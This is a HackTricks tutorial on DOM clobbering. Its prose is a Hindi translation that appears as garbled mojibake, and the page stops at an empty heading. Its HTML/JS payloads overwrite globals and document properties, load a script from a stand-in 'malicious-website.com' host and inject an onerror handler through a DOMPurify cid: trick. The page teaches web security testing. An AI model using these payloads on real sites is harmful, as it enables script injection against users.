# рдбреЙрдо рдХреНрд▓реЙрдмрд░рд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family) рджреЗрдЦреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреА рдЬрд╛рдирдХрд╛рд░реА рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## **рдореВрд▓ рдмрд╛рддреЗрдВ**

HTML рдЯреИрдЧ рдореЗрдВ **`id`** рдФрд░ **`name`** рдЧреБрдгреЛрдВ рдХреЗ рд╕рд╛рде **JS рд╕рдВрджрд░реНрдн рдореЗрдВ рд╡реИрд╢реНрд╡рд┐рдХ рдЪрд░реЛрдВ** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**рдХреЗрд╡рд▓** рдХреБрдЫ рддрддреНрд╡ рд╣реА **рдирд╛рдо рд╡рд┐рд╢реЗрд╖рддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреНрд▓реЛрдмрд▓реНрд╕ рдХреЛ **рдХреНрд▓реЙрдмрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡реЗ рд╣реИрдВ: `embed`, `form`, `iframe`, `image`, `img` рдФрд░ `object`.

рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм рдЖрдк рдПрдХ **рдлреЙрд░реНрдо рддрддреНрд╡** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрд░ рдХреЛ **рдХреНрд▓реЙрдмрд░** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рддрддреНрд╡ рдХреА рдЦреБрдж рдХреА **`toString`** рдорд╛рди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреА: `[object HTMLFormElement]` рд▓реЗрдХрд┐рди **рдРрдВрдХрд░** рдХреЗ рд╕рд╛рде **`toString`** рдРрдВрдХрд░ **`href`** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **`a`** рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд▓реЙрдмрд░ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЬрдм рдпрд╣ **рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдк **рдорд╛рди** рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays & Attributes

рдПрдХ рдПрд░реЗ рдФрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЛ рднреА **clobber** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**рдПрдХ рддреАрд╕рд░реЗ рдЧреБрдг** (рдЬреИрд╕реЗ x.y.z) рдХреЛ clobber рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **`form`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
рдЕрдзрд┐рдХ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рдХреЛ рдХреНрд▓реЙрдмрд░ рдХрд░рдирд╛ **рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА рд╕рдВрднрд╡ рд╣реИ**, рдЖрдЗрдлреНрд░реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
рд╕реНрдЯрд╛рдЗрд▓ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рдЖрдИрдлреНрд░реЗрдо рдХреЛ рд░реЗрдВрдбрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╕рдордп рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕рдХреЗ рдмрд┐рдирд╛ рдЖрдкрдХреЛ **рдЕрдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдЕрд▓рд░реНрдЯ рдорд┐рд▓реЗрдЧрд╛ред
{% endhint %}

рдЧрд╣рд░реЗ рдЧреБрдгреЛрдВ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **рдПрдЪрдЯреАрдПрдордПрд▓ рдХреЛрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЖрдИрдлреНрд░реЗрдореНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕ рддрд░рд╣ рд╕реЗ:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **рдлрд╝рд┐рд▓реНрдЯрд░ рдмрд╛рдИрдкрд╛рд╕**

рдпрджрд┐ рдПрдХ рдлрд╝рд┐рд▓реНрдЯрд░ рдиреЛрдб рдХреА **рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ** рдХреЛ `document.getElementByID('x').attributes` рдЬреИрд╕реА рдХреБрдЫ рдЪреАрдЬрд╝реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд▓реВрдк** рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ** **`.attributes`** рдХреЛ **рдХреНрд▓реЙрдмрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ **рдЯреВрдЯрд╛ рд╕рдХрддреЗ** рд╣реИрдВред **`tagName`**, **`nodeName`** рдпрд╛ **`parentNode`** рдЬреИрд╕реА рдЕрдиреНрдп DOM рд╕рдВрдкрддреНрддрд┐рдпрд╛рдВ рднреА **рдХреНрд▓реЙрдмрд░** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject` рдХреЛ Clobber рдХрд░рдирд╛**

рдЬреЛрдЦрд┐рдо рдЙрдард╛рдиреЗ рд╡рд╛рд▓реЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдбреЗрд╡рд▓рдкрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкреИрдЯрд░реНрди рд╣реИ:
```javascript
var someObject = window.someObject || {};
```
рдпрджрд┐ рдЖрдк рдкреГрд╖реНрда рдкрд░ рдХреБрдЫ HTML рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк `someObject` рд╕рдВрджрд░реНрдн рдХреЛ рдПрдХ DOM рдиреЛрдб, рдЬреИрд╕реЗ рдПрдВрдХрд░ рдХреЗ рд╕рд╛рде рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдпреБрдХреНрдд рдХреЛрдб рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд HTML рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ `someObject` рд╕рдВрджрд░реНрдн рдХреЛ рдПрдВрдХрд░ рддрддреНрд╡ рдХреЗ рд╕рд╛рде рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд░реЗрдВ:

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

рдЙрд╕ рдбреЗрдЯрд╛ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ **`window.someObject.url`** рд╣реЛрдЧрд╛ `href=//malicious-website.com/malicious.js`

**рдЯреНрд░рд┐рдХ**: **`DOMPurify`** рдЖрдкрдХреЛ **`cid:`** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдбрдмрд▓-рдХреЛрдЯреНрд╕ рдХреЛ URL-encode рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдПрдХ рдПрдиреНрдХреЛрдбреЗрдб рдбрдмрд▓-рдХреЛрдЯреНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд░рдирдЯрд╛рдЗрдо рдкрд░ рдбрд┐рдХреЛрдб рд╣реЛрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдирд╛ **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** рдПрдЪрдЯреАрдПрдордПрд▓ рдПрдиреНрдХреЛрдбреЗрдб `&quot;` рдХреЛ **рд░рдирдЯрд╛рдЗрдо рдкрд░ рдбрд┐рдХреЛрдб рдХрд░реЗрдЧрд╛** рдФрд░ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдорд╛рди рд╕реЗ **рдмрдЪрдХрд░** **`onerror`** рдЗрд╡реЗрдВрдЯ рдХреЛ **рдмрдирд╛рдПрдЧрд╛**ред

рдПрдХ рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХ рд╣реИ **`form`** рдПрд▓рд┐рдореЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред рдХреБрдЫ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдирдП рдмрдирд╛рдП рдЧрдП рдлреЙрд░реНрдо рдПрд▓рд┐рдореЗрдВрдЯ рдХреЗ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рдХреЛ рд╕реЗрдирд┐рдЯрд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдПрдЧреАред рд▓реЗрдХрд┐рди, рдЕрдЧрд░ рдЖрдк рдлреЙрд░реНрдо рдХреЗ рдЕрдВрджрд░ `id=attributes` рдХреЗ рд╕рд╛рде `input` рдмрдирд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рджреЗрдВрдЧреЗ** рдФрд░ рд╕реЗрдирд┐рдЯрд╛рдЗрдЬрд░ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд╣реАрдВ рдЬрд╛ рд╕рдХреЗрдЧрд╛ред

рдЖрдк [**рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ clobbering рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ CTF рд░рд╛рдЗрдЯрдЕрдк рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ред

## рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ Clobber рдХрд░рдирд╛

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ рдХреЛ DOM Clobbering рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕рдХреЗ рдЕрдиреБрд╕рд╛рд░:

> [рдбреЙрдХреНрдпреВрдореЗрдВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#document) рдЗрдВрдЯрд░рдлрд╝реЗрд╕ [рдиреЗрдореНрдб рдкреНрд░реЙрдкрд░реНрдЯреА](https://webidl.spec.whatwg.org/#dfn-support-named-properties) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИред рдХрд┐рд╕реА рднреА рд╕рдордп рдПрдХ [рдбреЙрдХреНрдпреВрдореЗрдВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#document) рдСрдмреНрдЬреЗрдХреНрдЯ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЗ [рд░реВрдЯ](https://dom.spec.whatwg.org/#concept-tree-root) рдХреЗ рд░реВрдк рдореЗрдВ [рдПрдХ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдЯреНрд░реА](https://dom.spec.whatwg.org/#in-a-document-tree) рдореЗрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ [рдПрдХреНрд╕рдкреЛрдЬрд╝реНрдб](https://html.spec.whatwg.org/multipage/dom.html#exposed) [рдПрдореНрдмреЗрдб](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [рдлреЙрд░реНрдо](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [рдЖрдИрдлреНрд░реЗрдо](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), рдФрд░ [рдПрдХреНрд╕рдкреЛрдЬрд╝реНрдб](https://html.spec.whatwg.org/multipage/dom.html#exposed) [рдСрдмреНрдЬреЗрдХреНрдЯ](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рднреА [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдХреА рдорд╛рди, рдЬреЛ рдПрдХ рдЧреИрд░-рдЦрд╛рд▓реА рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЗ [рд░реВрдЯ](https://dom.spec.whatwg.org/#concept-tree-root) рдХреЗ рд░реВрдк рдореЗрдВ [рдПрдХ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдЯреНрд░реА](https://dom.spec.whatwg.org/#in-a-document-tree) рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИрдВ:\
> \
> \- рд╕рднреА [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рд╡рд╛рд▓реЗ [рдПрдХреНрд╕рдкреЛрдЬрд╝реНрдб](https://html.spec.whatwg.org/multipage/dom.html#exposed) [рдПрдореНрдмреЗрдб](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [рдлреЙрд░реНрдо](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [рдЖрдИрдлреНрд░реЗрдо](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), рдФрд░ [рдПрдХреНрд╕рдкреЛрдЬрд╝реНрдб](https://html.spec.whatwg.org/multipage/dom.html#exposed) [рдСрдмреНрдЬреЗрдХреНрдЯ](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдХреА рдорд╛рди;\
> \
> \- рд╕рднреА [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рд╡рд╛рд▓реЗ [рдСрдмреНрдЬреЗрдХреНрдЯ](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдХреА рдорд╛рди;\
> \
> \- рд╕рднреА [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдФрд░ [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдПрдХ рдЧреИрд░-рдЦрд╛рд▓реА [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдФрд░ рдПрдХ рдЧреИрд░-рдЦрд╛рд▓реА [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП [рдЗрдореЗрдЬ](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) рдПрд▓рд┐рдореЗрдВрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдПрдХ рдЧреИрд░-рдЦрд╛рд▓реА [рдирд╛рдо рд╕рд╛рдордЧреНрд░реА рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) рдХреА рдорд╛рди, рдФрд░ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЗ [рд░реВрдЯ](https://dom.spec.whatwg.org/#concept-tree-root) рдХреЗ рд░реВрдк рдореЗрдВ [рдПрдХ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдЯреНрд░реА](https://dom.spec.whatwg.org/#in-a-document-tree) рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ **рдорд╛рди рдЬреИрд╕реЗ `document.cookie`, `document.body`, `document.children`**, рдФрд░ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдореЗрдВ рддрд░реАрдХреЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `document.querySelector`ред
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)┬а[img, form, cookie: img]

typeof(document.cookie)
'object
```
## рддрддреНрд╡ рдХреЛ рдЪрдЯрдХрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд▓рд┐рдЦрдирд╛

рдЖрдк рдПрдХ **`document.getElementById()`** рдФрд░ **`document.querySelector()`** рдХреЙрд▓ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдЪрдЯрдХрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ **рдЖрдк рдПрдХ `<html>` рдпрд╛ `<body>` рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд╕рдорд╛рди id рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛ**ред рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
рдпрд╣рд╛рдВ рдФрд░ рднреА рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдЖрдк `innerText` рд╕реЗ рддрддреНрд╡реЛрдВ рдХреЛ **рдЫрд┐рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдПрдХ HTML/body рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕реЗ `innerText` рд╕реЗ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдЯрд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдиреНрдп рдкрд╛рда рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдореЗрдВ рдмрд╛рдзрд╛ рди рдбрд╛рд▓реЗрдВ:
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
рд╣рдордиреЗ SVG рднреА рджреЗрдЦрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ `<body>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
рдЖрдкрдХреЛ Chrome рдФрд░ Firefox рджреЛрдиреЛрдВ рдореЗрдВ SVG рдореЗрдВ HTML рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `<foreignobject>` рдЯреИрдЧ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## рдлреЙрд░реНрдо рдХреЛ рдЕрджреНрдпрддрди рдХрд░рдирд╛

